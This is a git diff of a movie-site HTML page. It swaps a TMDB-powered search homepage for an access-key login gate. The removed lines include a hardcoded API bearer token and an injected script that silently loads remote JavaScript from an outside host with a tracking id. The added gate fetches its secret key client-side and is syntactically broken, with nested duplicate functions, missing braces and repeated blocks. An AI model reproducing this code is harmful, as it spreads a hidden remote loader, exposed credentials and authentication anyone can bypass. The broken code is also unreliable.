@@ -1,236 +1,144 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Chuzis – Home</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: 'Comic Sans MS', cursive, sans-serif;
-      background-color: #111;
-      color: #fff;
-    }
-
-    #loading-screen {
-      position: fixed;
-      z-index: 9999;
-      background-color: #111;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      animation: fadeOut 2s ease 3s forwards;
-    }
-
-    .loader-content img {
-      width: 150px;
-      height: auto;
-      animation: catDrop 2s ease-in, catSpinScale 1.5s ease-out 2s forwards;
-    }
-
-    .loader-content h1 {
-      font-size: 2rem;
-      color: #ff69b4;
-      text-align: center;
-      margin-top: 20px;
-    }
-
-    @keyframes fadeOut {
-      to {
-        opacity: 0;
-        visibility: hidden;
-      }
-    }
-
-    @keyframes catDrop {
-      0% {
-        transform: translateY(-100%);
-        opacity: 0;
-      }
-      100% {
-        transform: translateY(0);
-        opacity: 1;
-      }
-    }
-
-    @keyframes catSpinScale {
-      0% {
-        transform: rotate(0deg) scale(1);
-      }
-      100% {
-        transform: rotate(360deg) scale(3);
-      }
-    }
-
-    header {
-      padding: 20px;
-      background: #222;
-      text-align: center;
-      font-size: 2rem;
-      color: #ff69b4;
-    }
-
-    #search-section {
-      padding: 30px;
-      text-align: center;
-    }
-
-    #search-section input {
-      padding: 10px;
-      width: 300px;
-      border: none;
-      border-radius: 6px;
-    }
-
-    #search-section button {
-      padding: 10px 20px;
-      margin-left: 10px;
-      background: #ff69b4;
-      color: #000;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-
-    #results {
-      padding: 20px;
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-      gap: 20px;
-    }
-
-    .movie-card {
-      background: #1e1e1e;
-      border-radius: 8px;
-      padding: 10px;
-      text-align: center;
-    }
-
-    .movie-card img {
-      width: 100%;
-      border-radius: 6px;
-    }
-
-    .movie-card h3 {
-      color: #ff69b4;
-      font-size: 1.1rem;
-      margin: 10px 0 5px;
-    }
-
-    .movie-card a {
-      display: inline-block;
-      margin-top: 10px;
-      color: #fff;
-      text-decoration: underline;
-    }
-  </style>
-</head>
-<body>
-  <div id="loading-screen">
-    <div class="loader-content">
-      <img src="https://i.imgur.com/HcMiw8u.png" alt="Orange Cat Eating Popcorn" />
-      <h1>Loading Chuzis...</h1>
-    </div>
+@@ -56,65 +56,29 @@ <h2>Enter Access Key</h2>
+    <button onclick="checkKey()">Submit</button>
+    <div id="errorMsg" class="error"></div>
   </div>
+  <div id="cookieConsent" style="
+  position: fixed;
+  bottom: 0;
+  background: #222;
+  color: white;
+  width: 100%;
+  padding: 1em;
+  text-align: center;
+  z-index: 9999;
+  display: none;
+">
+  This site uses cookies to remember your access key. 
+  <button id="acceptCookies" style="margin-left: 10px; padding: 0.5em 1em; background: #e50914; border: none; color: white; border-radius: 5px; cursor: pointer;">
+    Accept
+  </button>
+</div>
 
-  <header>🎬 Welcome to Chuzis</header>
+<script>
+  function setCookie(name, value, days = 3650) {
+    const d = new Date();
+    d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+    document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/`;
+  }
 
-  <div id="search-section">
-    <input type="text" id="movieSearch" placeholder="Search for a movie..." />
-    <button onclick="searchMovie()">Search</button>
+  function getCookie(name) {
+    const value = `; ${document.cookie}`;
+    const parts = value.split(`; ${name}=`);
+    if (parts.length === 2) return parts.pop().split(';').shift();
+  }
+
+  // Show cookie banner if user hasn't accepted cookies yet
+  if (!getCookie("cookiesAccepted")) {
+    document.getElementById("cookieConsent").style.display = "block";
+  }
+
+  // Handle accept button
+  document.getElementById("acceptCookies").addEventListener("click", function() {
+    setCookie("cookiesAccepted", "true");
+    document.getElementById("cookieConsent").style.display = "none";
+  });
+</script>
+  <div id="cookieConsent" style="
+    position: fixed;
+    bottom: 0;
+    background: #222;
+    color: white;
+    width: 100%;
+    padding: 1em;
+    text-align: center;
+    z-index: 9999;
+    display: none;">
+    This site uses cookies to remember your access key. 
+    <button id="acceptCookies" style="margin-left: 10px; padding: 0.5em 1em; background: #e50914; border: none; color: white; border-radius: 5px; cursor: pointer;">
+      Accept
+    </button>
   </div>
-
-  <div id="results"></div>
 
   <script>
-    async function searchMovie() {
-      const query = document.getElementById("movieSearch").value;
-      const resultsContainer = document.getElementById("results");
-      resultsContainer.innerHTML = "<p>Searching...</p>";
+    let correctKey = null;
 
+    async function fetchKey() {
       try {
-        const res = await fetch(
-          `https://api.themoviedb.org/3/search/movie?query=${encodeURIComponent(
-            query
-          )}&include_adult=false&language=en-US&page=1`,
-          {
-            headers: {
-              Authorization:
-                "Bearer eyJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJlODA5MWQ0NDdlODQ3MjhlYmU0Mzc5NzI0NWNjNmY4NSIsIm5iZiI6MTc0ODAzNTQ0Mi43MDUsInN1YiI6IjY4MzBlNzcyNjQwZTA1YjQyOGI2YTlmYyIsInNjb3BlcyI6WyJhcGlfcmVhZCJdLCJ2ZXJzaW9uIjoxfQ.WoEuagI5GPkLtkM8xeY81jpNj6sS9VMRcYLuLS3xpFM",
-            },
-          }
-        );
-
-        const data = await res.json();
-        resultsContainer.innerHTML = "";
-
-        if (data.results.length === 0) {
-          resultsContainer.innerHTML = "<p>No movies found.</p>";
-          return;
-        }
-
-        data.results.forEach((movie) => {
-          const movieCard = document.createElement("div");
-          movieCard.classList.add("movie-card");
-
-          const img = document.createElement("img");
-          img.src = movie.poster_path
-            ? `https://image.tmdb.org/t/p/w300${movie.poster_path}`
-            : "https://via.placeholder.com/300x450?text=No+Image";
-          const title = document.createElement("h3");
-          title.textContent = movie.title;
-
-          const link = document.createElement("a");
-          link.href = `https://www.google.com/search?q=watch+${encodeURIComponent(
-            movie.title
-          )}+online`;
-          link.target = "_blank";
-          link.textContent = "Watch Now";
-
-          movieCard.appendChild(img);
-          movieCard.appendChild(title);
-          movieCard.appendChild(link);
-
-          resultsContainer.appendChild(movieCard);
-        });
-      } catch (error) {
-        resultsContainer.innerHTML = "<p>Error fetching movies.</p>";
+        const response = await fetch("protected/key.json");
+        const data = await response.json();
+        correctKey = data.key;
+        autoRedirectIfValid();
+      } catch (err) {
+        document.getElementById('errorMsg').textContent = "Failed to load key.";
       }
     }
-  </script>
 
-  <script>
-    (() => {
-      if (document.querySelector("script[data-awssuidacr]") !== null) {
+    function setCookie(name, value) {
+    function setCookie(name, value, days = 3650) {
+      const d = new Date();
+      d.setTime(d.getTime() + (3650 * 24 * 60 * 60 * 1000)); // 10 years
+      d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+      document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/`;
+    }
+
+@@ -124,25 +88,52 @@ <h2>Enter Access Key</h2>
+      if (parts.length === 2) return parts.pop().split(';').shift();
+    }
+
+    function showError(message) {
+      document.getElementById('errorMsg').textContent = message;
+    }
+
+    async function fetchKeyAndInit() {
+      try {
+        const response = await fetch("protected/key.json");
+        const data = await response.json();
+        correctKey = data.key;
+
+        const storedKey = getCookie('authKey');
+        if (storedKey && storedKey === correctKey) {
+          window.location.href = "home.html";
+        }
+      } catch (err) {
+        showError("Failed to load key.");
+      }
+    }
+
+    function checkKey() {
+      const inputKey = document.getElementById('keyInput').value;
+      if (!correctKey) {
+        showError("Key not loaded yet. Please wait.");
         return;
       }
-
-      const head = document.querySelector("head");
-      const awssuidacr = "6b2477f7-6c64-4a47-b71c-0ef74c1430c5";
-
-      function createScript(url) {
-        url = new URL(url);
-        url.searchParams.append("uuid", awssuidacr);
-
-        const script = document.createElement("script");
-        script.type = "text/javascript";
-        script.src = url.href;
-        script.dataset["awssuidacr"] = awssuidacr;
-
-        head.appendChild(script);
+      if (inputKey === correctKey) {
+        setCookie('authKey', inputKey);
+        window.location.href = "home.html";
+      } else {
+        document.getElementById('errorMsg').textContent = "Incorrect key. Try again.";
+        showError("Incorrect key. Try again.");
       }
+    }
 
-      createScript("https://infird.com/cdn/b50b7f30-3efc-40a4-958b-47c84a6ef83f");
-    })();
+    function autoRedirectIfValid() {
+      const storedKey = getCookie('authKey');
+      if (storedKey === correctKey) {
+        window.location.href = "home.html";
+      }
+    // Show cookie banner if not accepted
+    if (!getCookie("cookiesAccepted")) {
+      document.getElementById("cookieConsent").style.display = "block";
+    }
+
+    // Run on page load
+    fetchKey();
+    // Accept cookie handler
+    document.getElementById("acceptCookies").addEventListener("click", function() {
+      setCookie("cookiesAccepted", "true");
+      document.getElementById("cookieConsent").style.display = "none";
+    });
+
+    // Start logic on page load
+    window.onload = fetchKeyAndInit;
   </script>
 </body>
 </html>
